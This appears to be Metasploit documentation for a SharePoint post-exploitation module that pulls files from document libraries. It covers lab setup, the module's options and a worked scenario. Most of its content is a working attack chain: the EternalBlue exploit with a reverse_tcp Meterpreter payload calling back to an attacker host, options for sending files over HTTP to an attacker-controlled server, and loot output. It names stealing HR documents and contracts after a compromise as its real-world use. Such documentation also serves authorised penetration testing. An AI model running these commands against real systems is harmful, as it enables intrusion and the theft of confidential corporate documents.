# SharePoint Document Library Enumerator and Extractor

This document provides detailed instructions for setting up, verifying, and using the `post/windows/gather/sharepoint_document_extractor` module in Metasploit. It’s designed to help someone troubleshoot the module if it stops functioning with specific links and examples for clarity.

<!-- ## Vulnerable Application -->

This module targets Microsoft SharePoint Server installations on Windows systems. It requires a compromised Windows session (e.g., via Meterpreter) with access to SharePoint’s .NET assemblies (`Microsoft.SharePoint.dll`), which are included in a standard SharePoint installation.

### Setup Instructions
- **Supported Versions:** Tested on SharePoint Server 2016 and 2019. Future versions (e.g., SharePoint Server Subscription Edition) should work if the .NET API remains compatible.
- **Operating System:** Windows Server (e.g., 2016, 2019, 2022).
- **Installation:**
  1. **Obtain SharePoint Server:**
     - As of 2025, trials are available from Microsoft’s Evaluation Center (https://www.microsoft.com/en-us/evalcenter/). If links break, check the Wayback Machine (https://archive.org).
     - Example: SharePoint Server 2016 trial ISO (SHA256: check Microsoft archives if available).
  2. **Install on a Windows Server VM:**
     - Use VirtualBox or VMware with 8GB RAM and 100GB disk recommended.
     - Follow Microsoft’s setup guide: https://learn.microsoft.com/en-us/sharepoint/install/install-sharepoint-server (or archived versions if unavailable).
     - Default installation includes required .NET assemblies; no special configuration beyond site setup is needed.
  3. **Configure a SharePoint Site:**
     - Create a site (e.g., `http://<server_ip>`) via SharePoint Central Administration.
     - Add a document library named “Documents” (default) and upload test files (e.g., `test.pdf`, `doc1.docx`, each <10MB).
- **Dependencies:** Requires .NET Framework 4.5+ and SharePoint assemblies (`Microsoft.SharePoint.dll`), standard with SharePoint installs.

<!-- ## Verification Steps -->

1. **Install SharePoint:**
   - Set up SharePoint Server on a Windows VM as described above.
   - Upload test files (e.g., `test.pdf`, `doc1.docx`) to the “Documents” library.
2. **Start `msfconsole`:**
   
   msfconsole
Load the Module:

use post/windows/gather/sharepoint_document_extractor
Set Options:

set SESSION <session_id>  # Replace with your session ID from 'sessions -l'
set SITE_URL http://<target_ip>
set LIBRARY Documents
Run the Module:

run
Expected Result: Files are extracted to loot (Meterpreter) or sent via HTTP:

[*] Generating SharePoint document extractor payload...
[*] Executing payload on target session 1...
[*] Info: Enumerating:Documents:2 items
[+] Saved test.pdf to /root/.msf4/loot/20250317_123456_test.pdf
[+] Saved doc1.docx to /root/.msf4/loot/20250317_123457_doc1.docx
[*] Post module execution completed
<!-- ## Options -->
SITE_URL
Description: The full URL of the SharePoint site to target (e.g., http://192.168.1.100).
Usage: Must match the target’s SharePoint site exactly, including port if non-standard (e.g., http://192.168.1.100:8080). Use http:// (not https://) unless SSL is configured and accessible from the compromised session.
Default: http://sharepoint.local (update based on your test environment).
LIBRARY
Description: The name of the SharePoint document library to extract files from (e.g., Documents).
Usage: Must match an existing library on the target site. Case-sensitive in some SharePoint versions—verify via the SharePoint web interface.
Default: Documents (common default library name).
EXFIL_METHOD
Description: Specifies the method to exfiltrate files: METERPRETER (stores files as loot) or HTTP (sends files to an attacker-controlled server).
Usage: Set to METERPRETER for local loot storage or HTTP with EXFIL_HOST and EXFIL_PORT for remote transfer.
Default: METERPRETER.
EXFIL_HOST
Description: The IP or hostname of the attacker’s server for HTTP exfiltration (e.g., 192.168.1.101).
Usage: Required if EXFIL_METHOD is HTTP. Must be reachable from the target (e.g., run python3 -m http.server 8080 on Kali).
Default: Empty (not set).
EXFIL_PORT
Description: The port on the EXFIL_HOST for HTTP exfiltration (e.g., 8080).
Usage: Match the port of your HTTP server. Ensure no firewall blocks it on the target network.
Default: 8080.
MAX_SIZE
Description: Maximum file size (in bytes) to exfiltrate (e.g., 10485760 = 10MB).
Usage: Adjust to filter larger files; files exceeding this are skipped with a “SKIP:SizeExceeded” message.
Default: 10485760 (10MB).
<!-- ## Scenarios -->
SharePoint 2016 on Windows Server 2016 with Meterpreter Exfiltration
This scenario simulates extracting sensitive documents from a SharePoint server in a corporate network after gaining a Meterpreter session.

Steps:
Compromise the Target:
Use an exploit to gain a Meterpreter session:

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.101
set LPORT 4444
exploit
Confirm session: sessions -l (e.g., ID 1).
Load and Configure the Module:

use post/windows/gather/sharepoint_document_extractor
set SESSION 1
set SITE_URL http://192.168.1.100
set LIBRARY Documents
Run the Module:

run

Output:

[*] Generating SharePoint document extractor payload...
[*] Executing payload on target session 1...
[*] Info: Enumerating:Documents:3 items
[+] Saved report.pdf to /root/.msf4/loot/20250317_123456_report.pdf
[+] Saved memo.docx to /root/.msf4/loot/20250317_123457_memo.docx
[*] Post module execution completed
Notes:
Troubleshooting: If files don’t extract, verify SITE_URL is reachable from the target (execute -H -i -f cmd.exe then ping 192.168.1.100). Check Microsoft.SharePoint.dll in C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\<version>\ISAPI\.
Real-World Use: Extracting HR documents or contracts from a corporate SharePoint instance post-compromise.